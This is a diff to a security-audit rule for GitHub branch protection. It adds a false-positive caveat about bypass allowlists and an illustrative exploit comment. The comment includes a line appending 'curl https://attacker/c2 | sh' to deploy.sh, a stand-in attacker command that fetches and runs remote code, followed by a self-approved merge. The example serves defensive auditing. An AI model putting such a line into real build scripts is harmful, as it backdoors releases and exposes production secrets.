@@ -36,6 +36,32 @@ RULE = Rule(
         "protection rule exists; this rule scopes specifically to "
         "the review-count knob inside an existing rule."
     ),
+    known_fp=(
+        "``required_pull_request_reviews.bypass_pull_request_"
+        "allowances`` is not consulted today: a protection rule "
+        "that requires reviews but lists every contributor in the "
+        "bypass allowlist still passes this rule even though the "
+        "control is unenforced in practice. A future SCM-NNN rule "
+        "will key off the bypass list directly; until then, audit "
+        "the allowlist in the GitHub UI when this rule passes on a "
+        "high-trust repo.",
+    ),
+    exploit_example=(
+        "# With protection but no required reviews, a maintainer can\n"
+        "# self-approve a tampered change in two clicks:\n"
+        "#\n"
+        "#   git checkout -b release-fix\n"
+        "#   echo 'curl https://attacker/c2 | sh' >> deploy.sh\n"
+        "#   git commit -am 'fix: handle edge case'\n"
+        "#   git push origin release-fix\n"
+        "#   gh pr create --fill\n"
+        "#   gh pr merge --squash --auto    # no second-set-of-eyes\n"
+        "#   # Release pipeline runs the tampered build with full\n"
+        "#   # production secrets in scope.\n"
+        "#\n"
+        "# Setting ``required_approving_review_count`` to >= 1 forces\n"
+        "# a separate identity to acknowledge the change before merge."
+    ),
 )
 
 
